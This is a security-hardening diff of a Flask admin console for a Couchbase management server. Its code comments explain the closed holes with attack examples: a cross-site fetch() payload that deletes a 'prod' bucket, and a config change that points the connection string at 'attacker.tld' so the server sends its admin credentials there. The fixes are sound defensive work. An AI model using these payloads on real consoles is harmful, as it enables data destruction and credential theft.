@@ -11,9 +11,10 @@ Authentication modes (controlled by OAUTH_ENABLED env var):
         session server-side. A signed HttpOnly cookie tracks the session.
 
       Client Credentials  (M2M / API access)
-        POST /auth/token with { "grant_type": "client_credentials" } returns a
-        short-lived access token that callers supply as  Authorization: Bearer <token>
-        on /api/* requests.
+        Clients hold their own client credentials and obtain tokens DIRECTLY
+        from the IdP's token endpoint, then supply them as
+        Authorization: Bearer <token> on /api/* requests. This server validates
+        tokens; it never issues them.
 
 Required env vars when OAUTH_ENABLED=true
   OAUTH_ISSUER              https://your-idp.example.com/realms/mcp
@@ -52,7 +53,6 @@ import re
 import secrets
 import sys
 import time
-from functools import wraps
 from typing import Any
 
 # ---------------------------------------------------------------------------
@@ -71,6 +71,92 @@ from flask import (  # noqa: E402
 )
 from flask_cors import CORS  # noqa: E402
 
+# The profile must be applied HERE too, not only in server.py. This module reads
+# OAUTH_ENABLED / CB_GUI_INSECURE_NO_AUTH and imports handlers.shared (which
+# snapshots CB_ADMIN_READ_ONLY_MODE), and it previously never imported
+# profile_config at all — so the enterprise defaults never reached the GUI, the
+# console was broken in both profiles, and critically `profile_config.validate()`
+# never ran for the one process it is meant to protect: `server.py` would exit 2 on
+# an incoherent posture while this process started and served the full destructive
+# tool surface.
+import deployment  # noqa: E402
+import profile_config  # noqa: E402
+
+
+def _enforce_gui_posture() -> None:
+    """Refuse to serve an incoherent or exposed posture. Module scope, not __main__.
+
+    Two defects this replaces:
+
+      * The old guard compared `host == "0.0.0.0"` literally, so `::`, an empty
+        value, or any specific LAN address bound a network interface unchallenged —
+        while the workstation profile sets CB_GUI_INSECURE_NO_AUTH=1, which waves
+        every /api/* request through.
+      * It lived under `if __name__ == "__main__"`, so `gunicorn gui.gui_server:app`
+        or any container entrypoint skipped it completely.
+    """
+    import ipaddress
+
+    problems = list(profile_config.PROFILE_ERRORS)
+
+    # Same rule as the MCP server: a requested-but-unusable audit sink is fatal.
+    import audit as _audit_mod
+
+    _sink_problem = _audit_mod.audit_sink_error()
+    if _sink_problem:
+        problems.append(_sink_problem)
+
+    host = (os.environ.get("GUI_HOST") or "127.0.0.1").strip()
+    allow_remote = (os.environ.get("CB_GUI_ALLOW_REMOTE") or "").strip().lower() in (
+        "1",
+        "true",
+        "yes",
+        "on",
+    )
+
+    def _is_loopback(candidate: str) -> bool:
+        if candidate in ("localhost", "localhost.localdomain"):
+            return True
+        try:
+            return ipaddress.ip_address(candidate).is_loopback
+        except ValueError:
+            return False
+
+    exposed = bool(host) and not _is_loopback(host)
+    if not host:
+        # An empty GUI_HOST makes Werkzeug bind every interface.
+        exposed = True
+
+    if exposed and _INSECURE_NO_AUTH_ACKNOWLEDGED:
+        problems.append(
+            f"GUI_HOST={host or '(empty = all interfaces)'} exposes a network "
+            "interface while CB_GUI_INSECURE_NO_AUTH is set, which serves the full "
+            "admin tool surface — including destructive tools — to any client that "
+            "can reach the port. Set OAUTH_ENABLED=true, or bind loopback."
+        )
+    if exposed and not allow_remote:
+        problems.append(
+            f"GUI_HOST={host or '(empty = all interfaces)'} is not a loopback "
+            "address and CB_GUI_ALLOW_REMOTE is not set."
+        )
+
+    if problems:
+        for problem in problems:
+            print(
+                f"[couchbase-admin-gui] REFUSING TO START: {problem}", file=sys.stderr
+            )
+        raise SystemExit(2)
+
+
+import audit  # noqa: E402
+import authz  # noqa: E402
+from auth.scope_gate import (  # noqa: E402
+    check_scope,
+    clear_token_claims,
+    principal_of,
+    session_has_automation_scope,
+    set_token_claims,
+)
 from handlers import (  # noqa: E402
     backup,
     buckets,
@@ -85,6 +171,7 @@ from handlers import (  # noqa: E402
     mcp_status,
     search_admin,
     security,
+    shared,
     stats,
     xdcr,
 )
@@ -94,10 +181,18 @@ from handlers.shared import (  # noqa: E402
     READ_ONLY_MODE,
     require_confirmation,
 )
+from logging_config import configure_from_env  # noqa: E402
 
 # ---------------------------------------------------------------------------
 # OAuth feature flag
 # ---------------------------------------------------------------------------
+#: Explicit, deliberately awkward acknowledgement that the GUI is running with no
+#: authentication. Required because "unauthenticated by default" is not a posture
+#: an administration console can ship with.
+_INSECURE_NO_AUTH_ACKNOWLEDGED = os.environ.get(
+    "CB_GUI_INSECURE_NO_AUTH", ""
+).strip().lower() in ("1", "true", "yes")
+
 _OAUTH_ENABLED = os.environ.get("OAUTH_ENABLED", "false").lower() in (
     "1",
     "true",
@@ -112,14 +207,40 @@ if _OAUTH_ENABLED:
 # ---------------------------------------------------------------------------
 # Flask app
 # ---------------------------------------------------------------------------
+# Enforced at import so a WSGI launch (gunicorn/uwsgi) cannot skip it.
+_enforce_gui_posture()
+
+# Configure logging in THIS process.
+#
+# configure_from_env() had exactly one caller — server.py — so the GUI process never
+# configured the `couchbase-admin` logger tree. Records propagated to a root logger
+# with no handlers, and logging.lastResort only emits at WARNING, so every INFO-level
+# AUDIT record from the console was DISCARDED. The round-3 fix that added
+# `_audit_gui` on every path was therefore inert in the workstation profile, and the
+# console remained the one way to perform a privileged operation without leaving a
+# trace — the exact property it was added to remove.
+#
+# The GUI tests did not catch it because caplog attaches to the root logger and
+# observes the logger CALL, which happens either way.
+configure_from_env()
+
 app = Flask(__name__, static_folder="static")
 
+# CB_GUI_ALLOWED_ORIGINS is honoured HERE as well as in _reject_cross_site_request.
+# Without it the refusal message told operators to set the variable, the request-side
+# check honoured it, and then no Access-Control-Allow-Origin header was emitted — so the
+# browser blocked the read anyway and the documented escape hatch did not work.
 CORS(
     app,
     origins=[
         re.compile(r"^https?://localhost(:[0-9]+)?$"),
         re.compile(r"^https?://127\.0\.0\.1(:[0-9]+)?$"),
         re.compile(r"^https?://\[::1\](:[0-9]+)?$"),
+        *[
+            o.strip()
+            for o in (os.environ.get("CB_GUI_ALLOWED_ORIGINS") or "").split(",")
+            if o.strip()
+        ],
     ],
     supports_credentials=True,  # Required for cookie-based sessions
 )
@@ -177,6 +298,18 @@ def _is_read_only(tool) -> bool:
     return bool(tool and tool.annotations and tool.annotations.readOnlyHint)
 
 
+#: Deployment gating, exactly as server.py applies it. The console ignored it
+#: entirely, so against Capella it advertised and would execute ~120 ns_server tools
+#: that cannot work there — the "tools that each fail with an opaque 401" problem the
+#: gating layer was written to remove, reintroduced through the other door.
+_DEPLOYMENT_MODE = deployment.detect_mode()
+_GATING = deployment.gating_enabled()
+
+
+def _tool_is_deployable(name: str) -> bool:
+    return not _GATING or deployment.tool_is_available(name, _DEPLOYMENT_MODE)
+
+
 def _visible_tools():
     # Admin server has no internally-DML-gated tools, so nothing is force-loaded
     # in read-only mode beyond the annotated read-only tools.
@@ -184,6 +317,8 @@ def _visible_tools():
     out = []
     for t in ALL_TOOLS:
         if t.name in DISABLED_TOOLS:
+            continue
+        if not _tool_is_deployable(t.name):
             continue
         if (
             READ_ONLY_MODE
@@ -305,7 +440,6 @@ _PUBLIC_PATHS = {
     "/auth/login",
     "/auth/callback",
     "/auth/logout",
-    "/auth/token",
     "/auth/status",
 }
 
@@ -314,33 +448,227 @@ def _is_public(path: str) -> bool:
     return path in _PUBLIC_PATHS or path.startswith("/static/")
 
 
-def require_auth(f):
-    """
-    Decorator that enforces authentication when OAUTH_ENABLED=true.
-    - API routes: returns 401 JSON on failure.
-    - Browser routes: handled by the frontend (which checks /auth/status).
-    """
+# NOTE: there is deliberately no `require_auth` decorator here any more.
+#
+# One was defined, complete with a 403 branch for the unauthenticated case, and was
+# NEVER APPLIED to a single route — the actual enforcement is the `global_auth_check`
+# before_request hook below. Dead security code is worse than none: it reads as a
+# control when someone greps for it, and its unreachable branches invite the
+# assumption that routes are individually protected.
 
-    @wraps(f)
-    def wrapper(*args, **kwargs):
-        if not _OAUTH_ENABLED:
-            return f(*args, **kwargs)
-        if _is_public(request.path):
-            return f(*args, **kwargs)
-        claims = _resolve_claims()
-        if claims is None:
-            return jsonify({"error": "Unauthorized", "auth_required": True}), 401
-        # Attach claims to request context for downstream use
-        request.oauth_claims = claims  # type: ignore[attr-defined]
-        return f(*args, **kwargs)
 
-    return wrapper
+#: Origins permitted to drive the console from a browser. The same shapes flask_cors
+#: is configured with — but enforced on the REQUEST, which is the part that matters.
+_ORIGIN_RE = re.compile(
+    r"^https?://(localhost|127\.0\.0\.1|\[::1\])(:[0-9]+)?$", re.IGNORECASE
+)
+
+
+def _extra_allowed_origins() -> list[str]:
+    return [
+        o.strip()
+        for o in (os.environ.get("CB_GUI_ALLOWED_ORIGINS") or "").split(",")
+        if o.strip()
+    ]
+
+
+def _origin_is_allowed(origin: str) -> bool:
+    return bool(_ORIGIN_RE.match(origin)) or origin in _extra_allowed_origins()
+
+
+def _reject_cross_site_request():
+    """Refuse browser-driven cross-site calls to the admin API.
+
+    flask_cors DOES NOT DO THIS. CORS governs whether the browser lets the calling
+    page READ the response; the request is dispatched and its side effects happen
+    regardless. Combined with ``get_json(force=True)`` — which parsed a JSON body
+    whatever the Content-Type — any page the developer visited could issue:
+
+        fetch("http://127.0.0.1:5173/api/call", {
+          method: "POST", mode: "no-cors",
+          headers: {"Content-Type": "text/plain"},
+          body: JSON.stringify({tool: "admin_bucket_delete",
+                                arguments: {bucket_name: "prod", confirm: true}})})
+
+    A "simple" request by CORS rules, so no preflight is sent and nothing is asked.
+    On a workstation the profile ships CB_GUI_INSECURE_NO_AUTH=1 (no cookie, no
+    token, so SameSite protects nothing), and the attacker's own ``confirm: true``
+    satisfied even the hard ceiling. The peer-address check passes trivially: the
+    browser IS on the developer's machine.
+
+    Two independent defences, because either alone has an edge case:
+
+      1. Require Content-Type: application/json on state-changing requests. That
+         makes a cross-origin fetch a NON-simple request, so the browser must
+         preflight it, and the preflight fails against the origin allowlist. This is
+         what actually stops the attack above.
+      2. Validate Origin (falling back to Referer) when present. Defence in depth,
+         and it matches what the MCP HTTP transport already does — the console, which
+         is the more browser-exposed of the two, had nothing.
+    """
+    # /auth/logout is a GET route with a side effect (it clears the session), so a
+    # cross-site GET could force a logout. Cheap to cover, so it is covered.
+    if request.method in ("GET", "HEAD", "OPTIONS") and request.path != "/auth/logout":
+        return None
+    if not request.path.startswith("/api/") and not request.path.startswith("/auth/"):
+        return None
+
+    origin = (request.headers.get("Origin") or "").strip()
+    if not origin:
+        referer = (request.headers.get("Referer") or "").strip()
+        if referer:
+            from urllib.parse import urlsplit
+
+            parts = urlsplit(referer)
+            if parts.scheme and parts.netloc:
+                origin = f"{parts.scheme}://{parts.netloc}"
+
+    if origin and not _origin_is_allowed(origin):
+        return (
+            jsonify(
+                {
+                    "ok": False,
+                    "error": (
+                        f"Cross-site request refused: Origin {origin!r} is not "
+                        "permitted to drive this console. Set CB_GUI_ALLOWED_ORIGINS "
+                        "if a different origin is legitimately serving the UI."
+                    ),
+                }
+            ),
+            403,
+        )
+
+    if request.path.startswith("/api/"):
+        content_type = (request.content_type or "").split(";")[0].strip().lower()
+        if content_type != "application/json":
+            return (
+                jsonify(
+                    {
+                        "ok": False,
+                        "error": (
+                            "Content-Type: application/json is required on this "
+                            f"endpoint (got {content_type or 'none'}). This is a CSRF "
+                            "defence: requiring it forces a browser to preflight any "
+                            "cross-origin call, which the origin allowlist then "
+                            "refuses."
+                        ),
+                    }
+                ),
+                415,
+            )
+    return None
+
+
+def _client_is_local() -> bool:
+    """Whether this request came from THIS machine.
+
+    The startup posture check reads GUI_HOST, which only the __main__ launcher sets:
+    `gunicorn -b 0.0.0.0:5173 gui.gui_server:app` leaves it unset, the check reads
+    the 127.0.0.1 default, and the process happily serves an unauthenticated admin
+    console on every interface — bypassing the guard specifically written to stop
+    that, via the launcher the container entrypoint actually uses.
+
+    Guessing the bind from argv or gunicorn internals would be more of the same kind
+    of inference. The peer address is the ground truth: a completed TCP handshake
+    from off-box cannot carry a loopback source address. X-Forwarded-For is
+    deliberately NOT consulted — trusting a header here would let any client claim
+    to be local.
+    """
+    import ipaddress
+
+    remote = (request.remote_addr or "").strip()
+    if not remote:
+        return False
+
+    # A forwarding header means an intermediary is present, and REMOTE_ADDR is then
+    # the PROXY's address rather than the client's. nginx or Traefik on the same host
+    # in front of 127.0.0.1:5173 makes every remote client look loopback, which turns
+    # this check into a rubber stamp — and _enforce_gui_posture sees GUI_HOST=127.0.0.1
+    # and raises nothing. Refusing rather than guessing: the header is not trusted to
+    # identify the client (that would be worse), it is only taken as evidence that
+    # REMOTE_ADDR cannot be believed.
+    for header in (
+        "X-Forwarded-For",
+        "X-Real-IP",
+        "Forwarded",
+        "X-Client-IP",
+        # A proxy that rewrites only these and no X-Forwarded-For is unusual but
+        # possible, and each one is equally good evidence that REMOTE_ADDR is the
+        # proxy's address rather than the client's.
+        "X-Forwarded-Host",
+        "X-Forwarded-Proto",
+        "X-Original-Forwarded-For",
+        "CF-Connecting-IP",
+        "True-Client-IP",
+    ):
+        if request.headers.get(header):
+            return False
+
+    try:
+        address = ipaddress.ip_address(remote.split("%")[0])
+    except ValueError:
+        return False
+
+    # A dual-stack socket reports a v4 client as ::ffff:127.0.0.1, and is_loopback is
+    # False for that — so genuine local clients were being refused. handlers/egress.py
+    # already normalises this; the check here did not.
+    mapped = getattr(address, "ipv4_mapped", None)
+    if mapped is not None:
+        address = mapped
+    return address.is_loopback
 
 
 # Apply auth check to all routes via before_request
 @app.before_request
 def global_auth_check():
+    # Claims must not leak between requests. Flask serves requests on pooled
+    # threads, and a contextvar set in a thread persists for that thread's life —
+    # so without this, request N+1 on the same worker thread could inherit request
+    # N's identity and scopes.
+    clear_token_claims()
+
+    cross_site = _reject_cross_site_request()
+    if cross_site is not None:
+        return cross_site
+
+    if _INSECURE_NO_AUTH_ACKNOWLEDGED and not _client_is_local():
+        return (
+            jsonify(
+                {
+                    "ok": False,
+                    "error": (
+                        "This console is running with CB_GUI_INSECURE_NO_AUTH set, "
+                        "which is only defensible for a local operator, and this "
+                        "request arrived from a non-loopback address "
+                        f"({request.remote_addr}). Refusing. Set OAUTH_ENABLED=true "
+                        "to serve remote clients."
+                    ),
+                }
+            ),
+            403,
+        )
+
     if not _OAUTH_ENABLED:
+        # Fail closed. With OAUTH_ENABLED unset — the default, and a variable that
+        # appears in neither .env.example nor the README — this returned None and
+        # every route, including /api/call, was open to any client that could reach
+        # the port: full tool enumeration and execution of every loaded tool,
+        # destructive ones included.
+        if not _INSECURE_NO_AUTH_ACKNOWLEDGED and request.path.startswith("/api/"):
+            return (
+                jsonify(
+                    {
+                        "ok": False,
+                        "error": (
+                            "Refusing to serve the admin API without "
+                            "authentication. Set OAUTH_ENABLED=true, or set "
+                            "CB_GUI_INSECURE_NO_AUTH=1 to acknowledge running "
+                            "unauthenticated on a trusted loopback interface."
+                        ),
+                    }
+                ),
+                403,
+            )
         return None
     if _is_public(request.path):
         return None
@@ -355,7 +683,17 @@ def global_auth_check():
         # Non-API routes serve the SPA which handles the redirect
         return None
     request.oauth_claims = claims  # type: ignore[attr-defined]
+    # Publish to the scope gate. Without this, check_scope() and
+    # session_has_automation_scope() saw no claims at all in this process, so the
+    # console ignored the token's scopes entirely: ANY authenticated user in the
+    # tenant — read-only scope or none — had the full destructive tool surface.
+    set_token_claims(claims)
     return None
+
+
+@app.teardown_request
+def _clear_claims(_exc=None):
+    clear_token_claims()
 
 
 # ---------------------------------------------------------------------------
@@ -537,42 +875,27 @@ def auth_logout():
     return resp
 
 
-@app.route("/auth/token", methods=["POST"])
-def auth_token():
-    """
-    Client Credentials token endpoint.
-
-    POST body (JSON):
-      { "grant_type": "client_credentials" }
-
-    Returns:
-      { "access_token": "...", "token_type": "Bearer", "expires_in": N }
-
-    The caller supplies the returned token as  Authorization: Bearer <token>
-    on subsequent /api/* requests.
-    """
-    if not _OAUTH_ENABLED:
-        return jsonify({"error": "OAuth not enabled"}), 400
-
-    body = request.get_json(force=True) or {}
-    if body.get("grant_type") != "client_credentials":
-        return jsonify(
-            {"error": "Only grant_type=client_credentials is supported here"}
-        ), 400
-
-    try:
-        tokens = _oidc.client_credentials_token()
-    except Exception as exc:
-        return jsonify({"error": f"Client credentials request failed: {exc}"}), 502
-
-    return jsonify(
-        {
-            "access_token": tokens.get("access_token", ""),
-            "token_type": tokens.get("token_type", "Bearer"),
-            "expires_in": tokens.get("expires_in", 3600),
-            "scope": tokens.get("scope", ""),
-        }
-    )
+# NOTE: there is deliberately no token-minting endpoint here.
+#
+# There used to be a POST /auth/token that performed a client-credentials grant
+# against the IdP using THIS SERVER'S client_id and client_secret, and returned the
+# resulting access token in the response body. It was also listed in _PUBLIC_PATHS,
+# so it required no authentication whatsoever.
+#
+# That is a credential-lending service. Anyone who could reach the GUI port — no
+# password, no session, no token — could ask for and receive a valid bearer token
+# carrying the server's own scopes, including the automation scope that authorises
+# unattended destructive operations. Every other control in this codebase (the scope
+# gate, the ceiling, the confirmation set, the audit principal) is downstream of
+# "the caller holds a legitimate token", so this one endpoint bypassed all of them
+# at once and made the audit trail attribute the attacker's actions to the server's
+# service identity.
+#
+# The correct shape for the enterprise flow is unchanged and needs nothing from us:
+# the workflow manager and each child agent hold their OWN client credentials and
+# obtain tokens directly from the IdP's token endpoint. This server only ever
+# VALIDATES tokens; it never issues them. auth/oidc.client_credentials_token()
+# remains for the CLI's own outbound use, but is not reachable over HTTP.
 
 
 @app.route("/auth/me")
@@ -609,15 +932,55 @@ def list_tools():
     return jsonify(result)
 
 
+def _audit_gui(
+    tool_name: str,
+    arguments: dict,
+    decision: str,
+    reason: str = "",
+    duration_ms: float | None = None,
+    correlation_id: str | None = None,
+) -> None:
+    """One audit record per decision, from the console as well as the transport.
+
+    The GUI previously emitted NOTHING. Every privileged operation performed through
+    the console — bucket deletes, user creation, failover — was invisible to the
+    audit trail, which made the console the one way to act without leaving a record.
+    Chris's requirement is that the log answers "who did what"; a second dispatch
+    path that answers nothing defeats it.
+    """
+    claims = getattr(request, "oauth_claims", None)
+    principal = principal_of(claims) if claims else None
+    if principal is None:
+        principal = {
+            "auth": "none" if not _OAUTH_ENABLED else "unresolved",
+            "automation": False,
+            **profile_config.local_identity(),
+        }
+    principal = {**principal, "via": "gui"}
+    audit.emit_tool_call(
+        tool=tool_name,
+        arguments=arguments,
+        decision=decision,
+        principal=principal,
+        reason=reason,
+        duration_ms=duration_ms,
+        source=request.remote_addr or "",
+        correlation_id=correlation_id,
+    )
+
+
 @app.route("/api/call", methods=["POST"])
 def call_tool():
-    body = request.get_json(force=True)
+    # force=False: the Content-Type requirement above is load-bearing, and
+    # force=True would parse a text/plain body and reinstate the CSRF path.
+    body = request.get_json(silent=True) or {}
     tool_name = body.get("tool")
     arguments = body.get("arguments", {}) or {}
 
     if not tool_name:
         return jsonify({"error": "Missing 'tool' field"}), 400
     if tool_name in DISABLED_TOOLS:
+        _audit_gui(tool_name, arguments, "denied_disabled", "CB_ADMIN_DISABLED_TOOLS")
         return jsonify(
             {"error": f"Tool '{tool_name}' is disabled by configuration"}
         ), 403
@@ -626,11 +989,29 @@ def call_tool():
     if tool is None:
         return jsonify({"error": f"Unknown tool: {tool_name}"}), 404
 
+    if not _tool_is_deployable(tool_name):
+        _audit_gui(
+            tool_name,
+            arguments,
+            "denied_deployment",
+            f"not available in {_DEPLOYMENT_MODE!r}",
+        )
+        return jsonify(
+            {
+                "error": (
+                    f"Tool '{tool_name}' is not available in {_DEPLOYMENT_MODE!r} "
+                    "deployment mode."
+                ),
+                "hint": deployment.unavailable_reason(tool_name, _DEPLOYMENT_MODE),
+            }
+        ), 403
+
     if (
         READ_ONLY_MODE
         and not _is_read_only(tool)
         and True  # admin server has no internally-DML-gated tools
     ):
+        _audit_gui(tool_name, arguments, "denied_read_only", "read-only mode")
         return jsonify(
             {
                 "error": (
@@ -640,93 +1021,166 @@ def call_tool():
             }
         ), 403
 
-    # Confirmation / automation model — mirrors server.py so the GUI exercises
-    # the real trust logic. A write tool is gated unless:
-    #   * the caller supplied confirm:true (interactive human), OR
-    #   * the GUI session is in "automation" mode (simulating an automation-
-    #     scoped principal) AND the tool is not in the hard ceiling.
-    # The hard ceiling (CB_ADMIN_ALWAYS_CONFIRM) always requires confirm, even
-    # in automation mode — exactly as the server enforces it.
+    # ── Authorization: scope, then the shared ceiling policy ─────────────────
+    #
+    # This block used to be a hand-copied paraphrase of server.py's logic, and it had
+    # drifted in three ways at once: no scope check, no audit record, and a ceiling
+    # test nested inside `if in_confirm_set and automation_mode` — so with automation
+    # mode off, a hard-ceiling tool fell through to the ordinary gate where the
+    # caller's own `confirm: true` satisfied it, and a read-only tool named in the
+    # ceiling was never checked at all.
+    #
+    # It now calls the same authz.evaluate() the MCP dispatch calls.
+    scope_denial = check_scope(tool)
+    if scope_denial:
+        _audit_gui(tool_name, arguments, "denied_scope", scope_denial)
+        return jsonify({"ok": False, "error": scope_denial}), 403
+
     is_write = not (
         tool.annotations and getattr(tool.annotations, "readOnlyHint", False)
     )
     in_confirm_set = is_write or tool_name in _CUSTOM_CONFIRMATION_TOOLS
 
-    automation_mode = bool(body.get("automation")) or (
-        os.environ.get("CB_ADMIN_GUI_AUTOMATION", "").lower() in ("1", "true", "yes")
-    )
-    hard_ceiling = {
-        n.strip()
-        for n in os.environ.get("CB_ADMIN_ALWAYS_CONFIRM", "").split(",")
-        if n.strip()
-    }
+    # Automation comes ONLY from the token's scopes, never from the request body.
+    #
+    # `bool(body.get("automation"))` used to be part of this expression, which let any
+    # caller self-promote out of the confirmation gate with one JSON field — the
+    # precise thing .env.example promises cannot happen. Reading it from the scope
+    # gate also means the console and the MCP transport agree on what "authorized
+    # automation" means, instead of the console having its own env-var notion of it.
+    has_automation = session_has_automation_scope()
 
-    if in_confirm_set and automation_mode:
-        if tool_name in hard_ceiling:
-            # A ceiling tool under automation must not be satisfiable by a
-            # self-supplied confirm:true — that is the agent rubber-stamping
-            # itself. Refuse; a human must approve via a non-automation session.
-            return jsonify(
-                {
-                    "ok": False,
-                    "error": (
-                        f"'{tool_name}' is in the automation hard ceiling "
-                        "(CB_ADMIN_ALWAYS_CONFIRM) and cannot run under automation "
-                        "mode, even with confirm:true. A human must approve it."
-                    ),
-                    "requires_confirmation": True,
-                    "hard_ceiling": True,
-                }
-            ), 403
-        # Authorized automation: skip the per-call human confirmation.
-        in_confirm_set = False
+    # The console NEVER counts as "a human is present" for the hard ceiling.
+    #
+    # It states this explicitly rather than inheriting CB_ADMIN_TRANSPORT, which
+    # describes the MCP server process and defaults to "stdio" when unset — the console
+    # would otherwise claim a human on the strength of a variable about another
+    # process.
+    #
+    # The tempting position is that a browser click IS a person, so a workstation
+    # console on a loopback peer with Origin validated should satisfy the ceiling. Two
+    # things defeat that:
+    #
+    #   * In the workstation profile the console is UNAUTHENTICATED
+    #     (CB_GUI_INSECURE_NO_AUTH=1), so there is no evidence about WHO clicked.
+    #   * The origin allowlist necessarily permits any localhost port, so any page
+    #     served from the developer's own machine — a project dev server, a compromised
+    #     npm package's, anything — is an allowed origin.
+    #
+    # The hard ceiling is opt-in and means "a person must approve THIS operation". The
+    # stdio path has a property the console cannot match: the MCP client surfaces the
+    # specific call and the person answers it. So ceiling tools are performed through
+    # an interactive MCP session, and the console refuses them with that instruction.
+    ceiling, in_confirm_set = authz.evaluate(
+        tool_name,
+        in_confirm_set=in_confirm_set,
+        has_automation_scope=has_automation,
+        human_present=False,
+    )
+    if not ceiling.allowed:
+        _audit_gui(tool_name, arguments, ceiling.decision, "hard ceiling")
+        return jsonify({"ok": False, "error": ceiling.reason, **ceiling.detail}), 403
 
     confirm_err = require_confirmation(tool_name, arguments, in_confirm_set)
     if confirm_err is not None:
+        _audit_gui(tool_name, arguments, "denied_confirmation", confirm_err)
         return jsonify(
             {
                 "ok": False,
                 "error": confirm_err,
                 "requires_confirmation": True,
-                "hard_ceiling": tool_name in hard_ceiling,
+                "hard_ceiling": tool_name in authz.hard_ceiling_tools(),
             }
         ), 403
 
-    arguments = {k: v for k, v in arguments.items() if k != "confirm"}
+    # Strip BOTH control fields, as the MCP dispatch does. The GUI stripped only
+    # `confirm`, so a caller following the documented advice to pass correlation_id was
+    # refused by the mass-assignment allow-list — the provenance field breaking the
+    # very tools it was meant to annotate.
+    _correlation = arguments.get("correlation_id")
+    arguments = {
+        k: v for k, v in arguments.items() if k not in ("confirm", "correlation_id")
+    }
 
     handler = HANDLERS.get(tool_name)
     if handler is None:
         return jsonify({"error": f"No handler for tool: {tool_name}"}), 500
 
+    started = time.perf_counter()
     try:
         result = handler.handle(tool_name, arguments)
+        elapsed = (time.perf_counter() - started) * 1000
         text = result[0].text if result else "{}"
         parsed = json.loads(text)
+        decision = (
+            "denied_handler"
+            if isinstance(parsed, dict) and parsed.get(shared.ERROR_MARKER) is True
+            else "allowed"
+        )
+        _audit_gui(
+            tool_name,
+            arguments,
+            decision,
+            str(parsed.get("error", ""))[:400] if isinstance(parsed, dict) else "",
+            elapsed,
+            correlation_id=_correlation,
+        )
         return jsonify({"ok": True, "result": parsed})
     except Exception as exc:
-        return jsonify({"ok": False, "error": str(exc)}), 200
+        elapsed = (time.perf_counter() - started) * 1000
+        _audit_gui(
+            tool_name,
+            arguments,
+            "error",
+            type(exc).__name__,
+            elapsed,
+            correlation_id=_correlation,
+        )
+        # redact_text, as the MCP path does through err(). Exception text folds in the
+        # cluster's raw response body, which is the one channel where a submitted
+        # credential can come back — every handler wraps handle() so this branch is
+        # nearly unreachable, but "nearly" is not a reason to leave the one dispatch
+        # path that does not redact.
+        return jsonify({"ok": False, "error": shared.redact_text(str(exc))}), 200
 
 
 @app.route("/api/config", methods=["GET", "POST"])
 def config():
     if request.method == "POST":
-        body = request.get_json(force=True) or {}
-        rejected = []
-        applied = []
-        for key, val in body.items():
-            if key not in _CONFIG_ALLOWLIST:
-                rejected.append(key)
-                continue
-            if val is None or val == "":
-                os.environ.pop(key, None)
-            else:
-                os.environ[key] = str(val)
-            applied.append(key)
-
-        import handlers.shared as sh
-
-        sh._cluster = sh._bucket = sh._collection = None
-        return jsonify({"ok": True, "applied": applied, "rejected": rejected})
+        # REMOVED — this endpoint was a credential-exfiltration primitive.
+        #
+        # The allow-list included CB_CONNECTION_STRING, CB_MGMT_PORT and
+        # CB_ADMIN_TLS_INSECURE, and handlers/shared.py re-reads those per request
+        # and attaches HTTP Basic credentials to every admin call. So:
+        #
+        #   POST /api/config {"CB_CONNECTION_STRING": "couchbase://attacker.tld"}
+        #   POST /api/call   {"tool": "admin_cluster_info"}
+        #
+        # made the server send the real Couchbase administrator username and
+        # password, base64 Basic, in cleartext, to a host the caller chose. It
+        # worked with authentication disabled (the default), needed no
+        # confirmation, and worked in read-only mode — because it never performed a
+        # write, it changed where the writes were pointed. Setting
+        # CB_ADMIN_TLS_INSECURE=true instead enabled MITM of the real cluster.
+        #
+        # Runtime mutation of connection identity and TLS posture by an HTTP client
+        # is not a defensible feature for an administration tool. Configuration
+        # belongs in the environment, set by whoever deploys the server.
+        return (
+            jsonify(
+                {
+                    "ok": False,
+                    "error": (
+                        "Runtime configuration changes are not supported. Set "
+                        "connection and TLS settings in the environment and "
+                        "restart. This endpoint was removed because it allowed a "
+                        "caller to redirect the server's cluster credentials to an "
+                        "arbitrary host."
+                    ),
+                }
+            ),
+            405,
+        )
 
     return jsonify(
         {
@@ -766,17 +1220,8 @@ if __name__ == "__main__":
     host = os.environ.get("GUI_HOST", "127.0.0.1")
     debug = os.environ.get("FLASK_DEBUG", "").lower() in ("1", "true", "yes", "on")
 
-    if host == "0.0.0.0" and os.environ.get("CB_GUI_ALLOW_REMOTE", "").lower() not in (
-        "1",
-        "true",
-        "yes",
-        "on",
-    ):
-        print(
-            "[gui] Refusing to bind to 0.0.0.0 without CB_GUI_ALLOW_REMOTE=1.",
-            file=sys.stderr,
-        )
-        host = "127.0.0.1"
+    # Bind posture is enforced by _enforce_gui_posture() at import time, which
+    # handles every non-loopback form and cannot be skipped by a WSGI launcher.
 
     if debug:
         print(
